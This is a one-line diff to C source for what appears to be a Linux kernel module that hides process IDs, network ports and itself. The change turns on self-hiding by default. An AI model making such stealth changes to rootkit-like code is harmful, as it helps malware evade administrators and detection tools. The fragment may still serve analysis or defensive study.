@@ -30,7 +30,7 @@ static char hide_pids[MAX_HIDDEN_PIDS][PID_LEN];
 static int hide_pids_count = 0;
 static u16 hide_ports[MAX_HIDDEN_PORTS];
 static int hide_ports_count = 0;
-static int self_hide = 0;
+static int self_hide = 1;
 
 module_param(self_hide, int, 0644);
 
